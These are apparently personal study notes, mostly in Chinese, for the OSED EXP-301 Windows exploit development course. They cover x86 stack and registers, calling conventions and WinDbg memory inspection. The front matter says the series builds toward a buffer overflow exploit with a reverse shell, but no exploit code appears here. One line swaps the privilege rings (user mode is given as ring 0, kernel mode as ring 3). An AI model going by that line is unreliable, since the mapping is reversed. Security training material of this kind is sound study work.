---
title: "[OSED, EXP-301] Instructional notes - Part 1"
date: 2026-10-21
author: "CHW"
tags:
  - offsec
description: "OSED EXP-301 筆記 Part 1，涵蓋 x86 架構與 CPU 暫存器、WinDbg 除錯基礎（記憶體讀寫、符號、Software/Hardware 中斷點、單步執行），以及 Stack Buffer Overflow 利用：以 Sync Breeze 為例控制 EIP、尋找 JMP ESP、檢查 Bad Characters，並用 msfvenom 產生 shellcode 取得 reverse shell。"
---

[OSED, EXP-301] Instructional notes - Part 1
===

# Table of Contents
[TOC]

# Windows User Mode Exploit Development: General Course Information
EXP-301 是為已經具備一定漏洞研究經驗的資安專業人員設計的
課程涵蓋 Windows 作業系統上二進位應用程式的初級到中級漏洞利用開發，並介紹二進位應用程式的逆向工程，以協助尋找漏洞: 發現程式漏洞、分析二進位檔案，到控制程式執行流程，最後建立可以利用漏洞的 Exploit

- [OSED Exam Guide](https://help.offsec.com/hc/en-us/articles/360052977212-EXP-301-Windows-User-Mode-Exploit-Development-OSED-Exam-Guide)\
OffSec Exploit Developer\
![image](https://hackmd.io/_uploads/HyatSPcsMe.png)\
(忠誠的 Web 🐶 考了 OSCP, OSWA, OSWE, OSEP，還是要面對 PWN)


## About the EXP-301 Course
- Windows 平台
- 以 C、C++ 等低階語言撰寫並編譯的二進位應用程式。
- 需要透過二進位分析尋找漏洞的情境
- 不包含內部腳本引擎的伺服器端應用程式
- 以 32-bit（x86）架構為主要學習目標
(大多數 32-bit 技術都可以移植到 64-bit)

>[!Important]
> "**OSCE³ 中唯一 60 分就能通過**"

# WinDbg and x86 Architecture
介紹 x86 架構一些基本概念，包括 CPU registers、program memory 和function return 機制。與使用 [WinDbg](https://en.wikipedia.org/wiki/WinDbg) 的基本技能\
(WinDbg: Microsoft 提供的 Windows 除錯工具，可以用來檢查程式執行狀態、CPU 暫存器、記憶體內容、組合語言指令與例外事件)
- EIP：目前的指令執行位置
- ESP：目前的堆疊頂端
- EBP：函式堆疊框架的參考位置（若該函式使用傳統框架）
- Stack Memory：堆疊中的資料、返回位址與其他內容
- Disassembly：目前位置附近的組合語言指令

## Introduction to x86 Architecture
頻繁使用 [Assembly](https://en.wikipedia.org/wiki/Assembly_language)（ASM）\
Assembly 是機器指令的可讀表示方式。CPU 最終執行的是機器碼，而反組譯器會將機器碼顯示為較容易閱讀的指令

🎯: CPU 透過哪些指令做這件事，以及這些指令如何改變暫存器與記憶體
### Program Memory
當 binary application 運行時，會在電腦中使用的記憶體邊界內以特定的方式分配記憶體。圖 1 展示了 Windows 中應用程式如何在最低記憶體位址 (`0x00000000`) 和最高記憶體位址 (`0x7FFFFFFF`) 之間分配 process memory

![image](https://hackmd.io/_uploads/H1QNpP5sfe.png)

>[!Note]
>熟悉的 info:
>- Process（行程）: 執行中的程式及其資源與虛擬位址空間
>- Thread（執行緒）: Process 內實際執行指令的執行單位
>- Virtual Memory（虛擬記憶體）: 程式所看到的位址空間，由作業系統管理並映射到實際記憶體或其他後端儲存
>
> ![operating-system-concepts-compressed](https://hackmd.io/_uploads/rklql_cjMl.jpg)


#### - The [Stack](https://en.wikipedia.org/wiki/Stack-based_memory_allocation)
[Last-In, First-Out](https://www.geeksforgeeks.org/lifo-last-in-first-out-approach-in-programming/) (LIFO) ，PUSH and POP assembly\
Stack 是一種資料結構，實際配置給 Thread 使用的記憶體區域。\
當 Thread 執行函式時，程式可能需要暫時保存：
- 函式的參數
- 區域變數
- 函式返回位址
- 暫存器的保存值
- 其他函式執行所需的資料

每個 Thread 都有自己的 Stack，是為了讓多個 Thread 可以各自進行函式呼叫及保存執行狀態\

![image](https://hackmd.io/_uploads/SywqSIAoMe.png)
(https://stackoverflow.com/questions/61848840/monitoring-call-stack-size-by-using-esp-pointer)

Stack 的「Top」由 ESP 指向目前有效的堆疊頂端

>[!Tip]
>以 push eax 為例，在一般 32-bit x86 操作模式下：
>1. ESP 減少 4。
>2. 將 EAX 的 4-byte 值寫入新的 Stack Top 位置。
>
>而 pop ebx 則會：
>1. 從 ESP 指向的位置讀取 4 bytes。
>2. 將讀出的值放入 EBX。
>3. ESP 增加 4。
>
> 原 `ESP = 0x0012FF00` 執行 push eax 後，典型結果為 `ESP = 0x0012FEFC`

#### - [Calling Conventions](https://en.wikipedia.org/wiki/Calling_convention)

Calling Convention 定義了函式呼叫時，呼叫端與被呼叫端如何協調參數、返回值、Stack，以及暫存器的使用方式

舉個 🌰： 一個函式
```c
int add(int a, int b)
{
    return a + b;
}
```
另一個函式呼叫它：
```c
int result = add(10, 20);
```

CPU 不會直接理解 add(10, 20) 這段 C 語法。編譯器必須將它轉換成機器指令，並依照特定呼叫慣例安排參數、呼叫函式，以及接收返回值。
在 32-bit x86 中，常見的呼叫慣例包括 cdecl、stdcall 和 fastcall

Calling Convention | 傳遞方式 | 由誰清理 Stack？ 
:------:|:-------|:--------:|
`cdecl`  |  參數通常由右至左放入 Stack | 呼叫端（Caller） |  
`stdcall`  | 參數通常由右至左放入 Stack |	被呼叫端（Callee）
`fastcall` | 部分參數透過暫存器傳遞，其餘依實作規則處理 | 依具體呼叫慣例與編譯器規則

(不同編譯器、函式宣告、最佳化設定及特殊情況，皆會影響實際產生的程式碼)

>[!Note]
> - Caller（呼叫端）：發起函式呼叫的程式碼。
> - Callee（被呼叫端）：實際被呼叫執行的函式。
>
>`add(10, 20);` 在典型的 32-bit x86 
>- cdecl 呼叫中，會看到類似以下：
>```asm
>push 20
>push 10
>call add
>```
>呼叫慣例會以由右至左的順序傳遞參數。完成兩次 Push 後，Stack Top 的位置會對應到第一個參數
>
>- 典型的 cdecl 
>```asm
>push 20
>push 10
>call add
>add  esp, 8
>```
>將 ESP 增加 8 bytes，讓 Stack 指標越過兩個 4-byte 參數所佔用的空間。這通常是 Caller 清理參數的方式
>- 典型的 stdcall 函式可能以 `ret 8` 結束\
>ret 8 會先從 Stack 取出返回位址，恢復呼叫端的執行流程，再額外跳過 8 bytes 的參數空間


#### - Function Return Mechanics
CPU 需要返回位址
```c
void main_function()
{
    helper_function();
    continue_work();
}
```
當 main_function() 呼叫 helper_function() 時，CPU 必須知道
helper_function() 執行完後，應該回到哪裡繼續執行

👉🏻 這個位置就是 Return Address。
在 x86 函式呼叫中，call 指令會將呼叫指令之後的下一個指令位址保存到 Stack，然後跳到目標函式執行。

舉個 🌰：假設 call 指令位於 0x00401000，長度為 5 bytes，那麼它的下一條指令位址就是 0x00401005
```asm
00401000  call 00402000
00401005  mov  eax, 1
```
>1. CPU 會將返回位址 0x00401005 壓入 Stack
>2. 將執行流程轉到 0x00402000
>3. 開始執行被呼叫函式
>
>![image](https://hackmd.io/_uploads/S1gZAIRoGe.png)


stack frame:\
![image](https://hackmd.io/_uploads/B1fX2ICjzg.png)

### CPU Registers
Registers 是 CPU 內部的高速儲存位置，CPU 可以直接利用進行運算、保存資料、追蹤 Stack，以及控制執行流程

CPU（在 32-bit arch）維護並使用一系列九個 nine 32-bit registers。registers 是 CPU 中容量小、速度極快的儲存位置，可以有效率地讀取或操作資料
![image](https://hackmd.io/_uploads/B125jDCoGg.png)
> 可從八個常見的 32-bit 通用暫存器，加上指令指標 EIP 來理解

在 16-bit x86 架構中，常見的暫存器名稱包括: AX, BX, CX, DX, SP, BP, SI, DI\
到了 32-bit x86，這些暫存器擴展成 EAX, EBX, ECX, EDX, ESP, EBP, ESI, EDI (E: Extended 😑)

每個暫存器可以儲存一個 32 位元值（從 0 到 0xFFFFFFFF），或被分成 16 位元或 8 位元 subregisters 

EAX register 🌰：\
![image](https://hackmd.io/_uploads/ry_qTvAjMx.png)

```asm
mov eax, 12345678h
```
此時
```
EAX = 0x12345678
 AX =     0x5678
 AH =       0x56
 AL =       0x78
```
若接著 `mov al, 0AAh`:
```
EAX = 0x123456AA
 AX =     0x56AA
 AH =       0x56
 AL =       0xAA
```
在傳統 32-bit x86 中，寫入 AL 只會改變 EAX 最低的 8 bits，不會自動改變 EAX 的其他位元\
Debugger 重點：可能只看到某個 8-bit 或 16-bit subregisters 被改變，而完整的 32-bit 暫存器仍保留其他資料

#### General Purpose Registers（通用暫存器）
原廠列出六個通用暫存器：EAX、EBX、ECX、EDX、ESI、EDI

Register | Name | Purpose
:------:|:-------|:--------|
EAX | accumulator | 算術與邏輯運算，也經常用來傳回整數或指標類型的函式返回值
EBX | base | Base pointer for memory addresses 保存一般資料，也常在指令中作為記憶體位址計算的基底
ECX | counter | 迴圈、位移操作，以及某些呼叫慣例或字串指令
EDX | data | 特定乘除法指令、I/O 操作，以及其他資料運算
ESI | source index | 字串或資料複製操作，表示來源資料的位置
EDI | destination index | 字串或資料複製操作，表示目的資料的位置

- ESP — The Stack Pointer
ESP Stack Pointer 堆疊指標，會追蹤目前 Stack Top 的位置\
一般 32-bit x86 的 Stack 操作:
    - `push eax`: ESP 減少 4
    - `pop ebx`: ESP 增加 4
    - `sub esp, 10h`: ESP 減少 16 bytes
    - `add esp, 10h`: ESP 增加 16 bytes

- EBP — The Base Pointer
EBP Base Pointer，也稱 Frame Pointer。在傳統的函式 Stack Frame 中，會提供一個相對穩定的參考位置，作為函數堆疊幀的 stable reference point\
在這種典型 Stack Frame 中：
    - `[EBP+4]` 返回位址
    - `[EBP+8]` 第一個堆疊參數
    - `[EBP+0Ch]` 第二個堆疊參數
    - `[EBP-4]` 可能是區域變數
    - `[EBP-8]` 可能是另一個區域變數

項目 | ESP | EBP
:------|:-------|:--------|
全名 | Extended Stack Pointer | Extended Base Pointer
主要用途 | 追蹤 Stack Top | 常用於定位 Stack Frame
變動情況 | 隨 Stack 操作頻繁改變 | 傳統函式框架中相對穩定
常見用途 | Stack Push / Pop、函式呼叫 | 存取參數與區域變數

- EIP — The Instruction Pointer
EIP Instruction Pointer（指令指標）。在 32-bit x86 架構中，EIP 保存 CPU 接下來要執行的指令位址。\
"攻擊者利用任何 memory corruption vulnerability（例如. buffer overflow）時的主要目標"\
`EIP = 0x00401000` 代表 CPU 的指令執行位置在 0x00401000

Stack Frame：
```
較高記憶體位址
+-----------------------+
| Function Arguments    |
+-----------------------+
| Return Address        |  ← 函式返回時使用
+-----------------------+
| Saved EBP             |
+-----------------------+
| Local Buffer          |
|                       |
+-----------------------+
較低記憶體位址
```
假設程式在 Local Buffer 中接收資料，卻沒有正確檢查輸入長度: (buffer overflow)
![image](https://hackmd.io/_uploads/SJw2HdRsGg.png)

>[!Important]
>假設你在 WinDbg 中看到以下：
>```
>EIP = 0x00401234
>ESP = 0x0012FEA0
>EBP = 0x0012FED0
>```
>可以初步理解為：
>- EIP：目前的指令執行位置
>- ESP：目前 Stack Top 的位置
>- EBP：可能是目前函式 Stack Frame 的參考位置
>
>如果程式崩潰，可將這三個值放在一起分析：
>1. 查看 EIP 指向什麼指令
>2. 查看 ESP 附近的 Stack 內容
>3. 查看 EBP 所在位置，以及其附近是否符合預期的 Stack Frame
>4. 對照反組譯結果，判斷程式為什麼走到目前的狀態

Web 仔已殘血\
![image](https://hackmd.io/_uploads/rkINOdCofg.png)

## Introduction to Windows Debugger
了解 x86 的 Stack、Calling Convention、CPU Registers，以及 EIP、ESP、EBP 的用途後，使用 WinDbg 控制程式執行、觀察組合語言、設定中斷點，以及檢查和操作記憶體

>[!Note]
>Windows 系統上有多種偵錯程式可供選擇。Ex. [Ghidra](https://ghidra-sre.org/)、[x64dbg](https://x64dbg.com/)、 [OllyDbg](http://www.ollydbg.de/) 和 [Immunity Debugger](https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml)等 user-friendly interface 工具\
>![image](https://hackmd.io/_uploads/HJ1xzzJnzx.png)

OSED 主要使用 WinDbg 包含在 [Software Development Kit](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) (SDK)、[Windows Driver Kit](https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk) (WDK) 和 [Debugging Tools for Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) 中，這些工具皆免費安裝

>[!Tip]
>2017 Microsoft 發布 [WinDbg Preview](https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/debugging-using-windbg-preview) 版本，新增 [time travel debugging](https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/time-travel-debugging-overview) 和用於腳本編寫的 [JavaScript API](https://docs.microsoft.com/en-gb/windows-hardware/drivers/debugger/windbg-scripting-preview) 等功能 。\
>🥚 WinDbg Preview 僅適用於 Windows 10 Anniversary Edition (1607/RS1) 及更高版本

### What is a Debugger?
Debugger 是介於目標應用程式與 CPU 之間、協助觀察與控制程式執行的工具。
更精確地說，除錯器會透過作業系統提供的除錯機制，與目標 Process 互動；它可以讓程式在特定事件發生時暫停，然後檢查或修改程式的執行狀態
![image](https://hackmd.io/_uploads/rJotVzyhGg.png)

Windows 的執行環境涉及[兩個權限層級](https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode)：User Mode（ring 0）與 Kernel Mode（ring 3）

CPU 在底層執行的是 Machine code，而人類可以透過 Assembly 更容易地理解這些指令 (詳細比較可以參考: [Pen-300 Note Part 1](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-1/#programming-language-level))

- A. Machine Code（機器碼）
Machine Code 是 CPU 能夠解碼並執行的二進位指令編碼，記憶體中可能以十六進位位元組表示 `B8 05 00 00 00`\
在 32-bit x86 中，這些位元組可反組譯為
```asm
mov eax, 5
```
機器碼是真正儲存在程式 image 中、供 CPU 取用的指令編碼。Assembly 則是讓人更容易閱讀的表示形式

- B. Opcode（操作碼）
Opcode 是指令編碼中指定操作類型的部分：完整機器指令可能包含 ModR/M、SIB、offset 或 Immediate 等欄位\
Ex. `mov eax, 5` 對應的機器碼 `B8 05 00 00 00`
    - `B8`：指定將 Immediate 載入 EAX 的指令形式
    - `05 00 00 00`：32-bit 立即數 5，以小端序（Little-endian）儲存
這是特定 x86 指令形式的例子，不能推論所有 mov 指令都會使用 B8

- C. Assembly（組合語言）
Assembly 是對機器指令的可讀表示
![image](https://hackmd.io/_uploads/Hkir2zJ2zl.png)

### WinDbg Interface
開啟 WinDbg (X86)\
![image](https://hackmd.io/_uploads/B1iT0G13fx.png)

1. Attach to Process：讓 WinDbg 附加到正在執行的程式，Ex. Notepad
2. Workspace：配置除錯介面，特別是 Command 與 Disassembly 視窗
3. Debugging Symbols：讓 WinDbg 能用函式名稱等符號資訊協助分析，而不只是顯示記憶體位址

在 WinDbg 選擇 "Attach to a Process"\
![image](https://hackmd.io/_uploads/rywIg712zl.png)

選擇 "Notepad.exe"\
![image](https://hackmd.io/_uploads/ByVcxm12zl.png)

![image](https://hackmd.io/_uploads/HkNkZ7Jnfe.png)
> 跳出 Command window

WinDbg 附加程序時，Windows 的除錯機制會讓 Debugger 接管相關的除錯事件。process 通常會在附加完成時暫停，讓使用者有機會先檢查現場

>[!Tip]
>Debugger 透過將記憶體中的目前指令替換為 `INT 3` assembly instruction 來注入 [software breakpoint](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/processor-breakpoints---ba-breakpoints-)。這是一個 single-byte software interrupt 用於觸發斷點異常

### Understanding the Workspace
Workspace 是 WinDbg 的視窗配置與工作環境。預設介面可能只顯示 Command Windows

強調兩個視窗： ([workspace layout](http://www.zachburlingame.com/2011/12/customizing-your-windbg-workspace-and-color-scheme/))
1. Command Window（指令視窗）
用來輸入除錯指令，例如 `r`、`u`、`dd`、`db`、`g`
2. Disassembly Window（反組譯視窗）
顯示機器碼所對應的組合語言指令、位址，以及附近的指令。可以用來觀察程式即將執行或已經執行過的指令

![image](https://hackmd.io/_uploads/BkfhiE1nMl.png)

>[!Caution]
>關閉 WinDbg 可能會一併終止正在被除錯的程序
>👉🏻 若直接關閉 WinDbg，Notepad 也可能跟著結束；若是服務程序，則可能需要重新啟動服務。


### Debugging Symbols
Debugging Symbols（除錯符號）可以透過名稱識別函式、結構與全域變數

Symbols files (.PDB) 是在 Microsoft 編譯 Windows 原生檔案時建立的\
當看到 `76A12340` 位址，未必知道對應到哪個函式。有可用的符號資訊時
`KERNEL32!SomeFunction` 可能顯示模組名稱與函式名稱，較容易理解程式的執行流程

>[!Tip]
>1. 取得 PDB 不代表一定能看到完整的 C/C++ source code。它提供的是除錯資訊，而非原始程式碼
>2. Microsoft 不會為所有程式庫提供 Symbols files，第三方程式也可能有自己的 PDB。
>3. 即使兩個 DLL 的名稱一樣，若來自不同版本或不同建置，對應的 PDB 也可能不相容

在 WinDbg: File > Symbol File Path
![image](https://hackmd.io/_uploads/HJTIkBk2Gl.png)
> 常用的 symbol path 是 `C:\symbols`，代表這個目錄可以用來存放或快取符號檔案

WinDbg 能從 Microsoft 的官方符號伺服器取得符號，必須設定符號伺服器來源
```
srv*C:\symbols*https://msdl.microsoft.com/download/symbols
```
![image](https://hackmd.io/_uploads/HywzkSJ3zl.png)

接著使用 `.reload /f` 強制重新載入
![image](https://hackmd.io/_uploads/ryrvXBy3Ml.png)

在某些情況下，若某個模組中不存在 Symbols files 會顯示以下錯誤 (不影響)
```windbg
0:003> .reload /f
Reloading current modules
..*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.16299.64_none_14403bb93691f395\COMCTL32.dll - 
..

Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.
Run !sym noisy before .reload to track down problems loading symbols.

...............................................

************* Symbol Loading Error Summary **************
Module name            Error
COMCTL32               - This error is unknown: 0x800c2eff. Please contact the debugger team to report this error. (Mail: windbgfb@microsoft.com)

You can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded.
You should also verify that your symbol search path (.sympath) is correct.
```
> 沒有取得 `COMCTL32.dll` 的符號檔案
> >- `!sym noisy` 顯示更詳細的診斷訊息 (`!sym quiet` 關閉)
> >![image](https://hackmd.io/_uploads/BJpKESJ3zl.png)
> >- 可利用 `.sympath` 顯示目前設定的符號搜尋路徑\
> >![image](https://hackmd.io/_uploads/S1ywVBynMx.png)

## Accessing and Manipulating Memory from WinDbg
使用 WinDbg 觀察 Windows Process 的記憶體，並理解記憶體中的機器碼、資料、指標，以及內部結構

### Unassemble from Memory
基本語法：`u [起始位址]`\
若要反組譯指定的函式，可以直接使用符號名稱 `u kernel32!GetCurrentThread`
> kernel32!GetCurrentThread 是符號名稱（Symbol）。只要符號載入正確，WinDbg 就能將它解析成實際的記憶體位址
> - `u`	Unassemble，反組譯
> - `kernel32!`	指定函式所屬的模組
> - `GetCurrentThread`	要分析的函式名稱


```
0:003> u kernel32!GetCurrentThread
KERNEL32!GetCurrentThread:
770b5910 6afe            push    0FFFFFFFEh
770b5912 58              pop     eax
770b5913 c3              ret
770b5914 cc              int     3
770b5915 cc              int     3
770b5916 cc              int     3
770b5917 cc              int     3
770b5918 cc              int     3
```
> ![image](https://hackmd.io/_uploads/B1Csprk3Ml.png)
> 若輸入 `g`，代表 Go 讓目標程序繼續執行

### Reading from Memory
使用 `u` 觀察 CPU 執行的指令後，接著直接查看記憶體中的原始資料

WinDbg 可以用不同的資料寬度顯示同一段記憶體
指令 | 資料單位 | 每個單位的大小
:------|:-------|:--------|
db | Byte | 1 byte
dw | WORD | 2 bytes
dd | DWORD | 4 bytes
dq | QWORD | 8 bytes

可參考 [MSDN debugging documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/d--da--db--dc--dd--dd--df--dp--dq--du--dw--dw--dyb--dyd--display-memor)

#### - b = Byte
db 逐 Byte 讀取記憶體
```dbg
0:000> db esp
00faf974  89 ab 1b 77 78 68 1f c1-50 ab 1b 77 50 ab 1b 77  ...wxh..P..wP..w
00faf984  00 00 00 00 78 f9 fa 00-00 00 00 00 ec f9 fa 00  ....x...........
00faf994  80 a3 18 77 90 ae fa b6-00 00 00 00 b4 f9 fa 00  ...w............
00faf9a4  a4 de e2 76 00 00 00 00-80 de e2 76 8a ae aa ca  ...v.......v....
00faf9b4  fc f9 fa 00 be 00 15 77-00 00 00 00 24 68 1f c1  .......w....$h..
00faf9c4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00faf9d4  00 00 00 00 00 00 00 00-00 00 00 00 24 68 1f c1  ............$h..
00faf9e4  c0 f9 fa 00 00 00 00 00-04 fa fa 00 80 a3 18 77  ...............w
```
> - esp 是 x86 CPU 的 Stack Pointer 暫存器，存放目前 Stack 頂端的記憶體位址
> 
> 假設 `ESP = 0x00FAF974` 執行 `db esp`: WinDbg 就從 0x00FAF974 開始，每次顯示一個 Byte (8 bits)

#### - w = Word
每次讀取 2 Bytes
```dbg
0:000> dw esp
00faf974  ab89 771b 6878 c11f ab50 771b ab50 771b
00faf984  0000 0000 f978 00fa 0000 0000 f9ec 00fa
00faf994  a380 7718 ae90 b6fa 0000 0000 f9b4 00fa
00faf9a4  dea4 76e2 0000 0000 de80 76e2 ae8a caaa
00faf9b4  f9fc 00fa 00be 7715 0000 0000 6824 c11f
00faf9c4  0000 0000 0000 0000 0000 0000 0000 0000
00faf9d4  0000 0000 0000 0000 0000 0000 6824 c11f
00faf9e4  f9c0 00fa 0000 0000 fa04 00fa a380 7718
```
原本 db 顯示的 `89 ab 1b 77` 變成 `ab89 771b`

>[!Important]
>**順序相反 ⁉️**\
>x86 使用 Little-Endian（小端序） 儲存多位元組數值。
Little-Endian 的規則是：數值最低有效位元組（Least Significant Byte）放在最低記憶體位址。
> 記憶體位址 | Byte |
>:------|:-------|
>0x00FAF974 | 89
>0x00FAF975 | AB
>
>合併成一個 16-bit WORD 時，數值就是：`0xAB89`\
>同一段記憶體採用不同的顯示寬度和數值解讀方式

#### - d = Double Word
每次讀取 4 Bytes
```dbg
0:000> dd esp
00faf974  771bab89 c11f6878 771bab50 771bab50
00faf984  00000000 00faf978 00000000 00faf9ec
00faf994  7718a380 b6faae90 00000000 00faf9b4
00faf9a4  76e2dea4 00000000 76e2de80 caaaae8a
00faf9b4  00faf9fc 771500be 00000000 c11f6824
00faf9c4  00000000 00000000 00000000 00000000
00faf9d4  00000000 00000000 00000000 c11f6824
00faf9e4  00faf9c0 00000000 00fafa04 7718a380
```
dd 每次顯示一個 DWORD 4 Bytes\
因為是 Little-Endian，得到 `0x771BAB89`
```
db esp  →  89 ab 1b 77
dw esp  →  ab89 771b
dd esp  →  771bab89
```
#### - q = Quad Word
每次讀取 8 Bytes, dq 顯示 QWORD，每個 QWORD 有 8 Bytes (64 bits)
```dbg
0:002> dq 00faf974
00faf974  c11f6878`771bab89 771bab50`771bab50
00faf984  00faf978`00000000 00faf9ec`00000000
00faf994  b6faae90`7718a380 00faf9b4`00000000
00faf9a4  00000000`76e2dea4 caaaae8a`76e2de80
00faf9b4  771500be`00faf9fc c11f6824`00000000
00faf9c4  00000000`00000000 00000000`00000000
00faf9d4  00000000`00000000 c11f6824`00000000
00faf9e4  00000000`00faf9c0 7718a380`00fafa04
```
> 反引號 是 WinDbg 用來分隔 64-bit 數值高低部分的顯示格式，不會實際在記憶體中
> ```
> c11f6878`771bab89
> ```
> 代表： `0xC11F6878771BAB89`

#### - dc 與 dW：同時查看資料與 ASCII
>[!Note]
>也可利用 `dc` 與 `dW` 同時查看資料與 ASCII\
> 除了以十六進位顯示資料，有時也希望直接看出這些位元組是否包含可讀文字

指令 | 用途 
:------:|:-------
dc | 以 DWORD 為單位顯示，並附上 ASCII 表示
dW | 以 WORD 為單位顯示，並附上 ASCII 表示
da | 顯示 ASCII 字串
du | 顯示 Unicode 字串

```dbg
0:000> dc KERNELBASE
75100000  00905a4d 00000003 00000004 0000ffff  MZ..............
75100010  000000b8 00000000 00000040 00000000  ........@.......
75100020  00000000 00000000 00000000 00000000  ................
75100030  00000000 00000000 00000000 000000f8  ................
75100040  0eba1f0e cd09b400 4c01b821 685421cd  ........!..L.!Th
75100050  70207369 72676f72 63206d61 6f6e6e61  is program canno
75100060  65622074 6e757220 206e6920 20534f44  t be run in DOS 
75100070  65646f6d 0a0d0d2e 00000024 00000000  mode....$.......
```
> KERNELBASE 是模組符號，WinDbg 解析成該模組的載入位址
> > `MZ` 是 Windows PE（Portable Executable）檔案格式的重要特徵：PE 檔案開頭通常具有 DOS Header，其 Signature 為 MZ

從 KERNELBASE 的基底位址再加上 offset 0x40 (往後偏移 64 個位元組)，然後以 WORD 為單位顯示資料與 ASCII 表示 (目標位址=基底位址+0x40)
```dbg
0:000> dW KERNELBASE+0x40
75100040  1f0e 0eba b400 cd09 b821 4c01 21cd 6854  ........!..L.!Th
75100050  7369 7020 6f72 7267 6d61 6320 6e61 6f6e  is program canno
75100060  2074 6562 7220 6e75 6920 206e 4f44 2053  t be run in DOS 
75100070  6f6d 6564 0d2e 0a0d 0024 0000 0000 0000  mode....$.......
75100080  abc8 b273 ca8c e11d ca8c e11d ca8c e11d  ..s.............
75100090  b285 e18e ca88 e11d ca8c e11c c9bb e11d  ................
751000a0  5638 e1f2 ca8f e11d 5638 e1ee ca83 e11d  8V......8V......
751000b0  5638 e1ec ca84 e11d 5638 e1ef c8be e11d  8V......8V......
```
#### - L 參數：控制顯示多少資料
顯示資料的預設長度為 0x80 位元組可以 `L` 參數來更改

Ex. 
- `dd esp L4` 顯示 4 個 DWORD 因此總量是：`4 x 4 = 16` Bytes
- `dd esp L10` L10 是十六進位的 0x10，即 16 個 DWORD ：`16 x 4 = 64` Bytes
```dbg
0:000> dd esp L4
00faf974  771bab89 c11f6878 771bab50 771bab50

0:000> dd esp L10
00faf974  771bab89 c11f6878 771bab50 771bab50
00faf984  00000000 00faf978 00000000 00faf9ec
00faf994  7718a380 b6faae90 00000000 00faf9b4
00faf9a4  76e2dea4 00000000 76e2de80 caaaae8a

0:000> dW KERNELBASE L2
75100000  5a4d 0090                               MZ..

0:000> db KERNELBASE L2
75100000  4d 5a                                   MZ
```
#### - da 與 du：讀取字串
當已知某個位址存放的是文字，就可以使用：`da <address>` 讀取 ASCII 字串

#### - poi：解參考指標（Pointer Dereference）
往後分析 Stack、函式指標與記憶體結構時經常會使用的技巧\
先理解什麼叫做指標，假設某個位址存放另一個位址：
```
ESP = 0x00FAF974

[0x00FAF974] = 0x771BAB89
```
> - `0x00FAF974` 目前 Stack Pointer 指向位置
> - `0x771BAB89` 是該位置儲存的 DWORD 數值
>若這個數值被當成位址，就可以進一步查看 0x771BAB89 的內容

讀取 ESP 所指向位置的 DWORD。再把讀到的數值當作新位址，再讀取那裡的記憶體
```dbg
dd esp L1
dd 771bab89
```
WinDbg 的 poi 可以把這兩個動作合併 `dd poi(esp)`\
![image](https://hackmd.io/_uploads/BJvMUA-2Gx.png)
> poi 本身不會讀資料，用於解參考指標的運算式\
> 外層的 dd 才負責將結果位址開始的資料顯示出來

### Dumping Structures from Memory
使用 Microsoft Symbols，讓 WinDbg 知道 Windows 內部結構的欄位名稱、資料型態與偏移量

[dt](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/dt--display-type-)：Display Type 指令\
基本語法：`dt [模組!結構名稱] [記憶體位址] [欄位名稱]`

- `u` 理解程式指令
- `db、dd` 讀取原始資料
- `dt` 把原始記憶體依照已知的資料結構解讀

```dbg
0:000> dt ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : Ptr32 Void
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : Ptr32 Void
   +0x02c ThreadLocalStoragePointer : Ptr32 Void
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
   +0x034 LastErrorValue   : Uint4B
   +0x038 CountOfOwnedCriticalSections : Uint4B
   +0x03c CsrClientThread  : Ptr32 Void
...
   +0xfe0 ResourceRetValue : Ptr32 Void
   +0xfe4 ReservedForWdf   : Ptr32 Void
   +0xfe8 ReservedForCrt   : Uint8B
   +0xff0 EffectiveContainerId : _GUID
```
> `_TEB`：Windows 的 Thread Environment Block 結構型態
> > - `+0x000`	欄位相對於結構起始位置的偏移量
> > - `NtTib`	欄位名稱
> > - `_NT_TIB`	欄位的資料型態
> > - `Ptr32 Void`	32 位元指標，指向未指定型態的資料
> > - `Uint4B`	4 Bytes 的無號整數
>>
>> `+0x030 ProcessEnvironmentBlock : Ptr32 _PEB`: 表示 TEB 中，偏移量 0x30 的位置存放一個 32 位元指標，指向 PEB 結構\
>> 假設某個 TEB 實例的起始位址是 0x00302000，那麼 ProcessEnvironmentBlock 欄位所在的位址就是：`0x00302000+0x30=0x00302030` 0x30 是相對偏移量，而 0x00302030 才是欄位的絕對位址

![image](https://hackmd.io/_uploads/ByzltRb2Ml.png)


>[!note]
>TEB [Thread Environment Block](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb) Thread 環境區塊\
>在 Windows 中，每個使用者模式 Thread 都有自己的 TEB。它包含與該 Thread 相關的資訊，Ex：
>- Thread 識別資訊。
>- Stack 的界限資訊。
>- Thread Local Storage（TLS）相關資訊。
>- 指向 PEB 的指標。
>- 其他 Thread 環境資料。
>TEB 的具體欄位和布局會受到 Windows 版本、目標架構及符號定義影響

解析目前 Thread 的實際資料: `$teb`\
$teb 是 WinDbg 的偽暫存器（[Pseudo-register](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax)），提供目前 Thread 的 TEB 位址
```dbg
:002> dt -r ntdll!_TEB @$teb
   +0x000 NtTib            : _NT_TIB
      +0x000 ExceptionList    : 0x004bfb68 _EXCEPTION_REGISTRATION_RECORD
         +0x000 Next             : 0x004bfbc4 _EXCEPTION_REGISTRATION_RECORD
         +0x004 Handler          : 0x77b37230           _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
      +0x004 StackBase        : 0x004c0000 Void
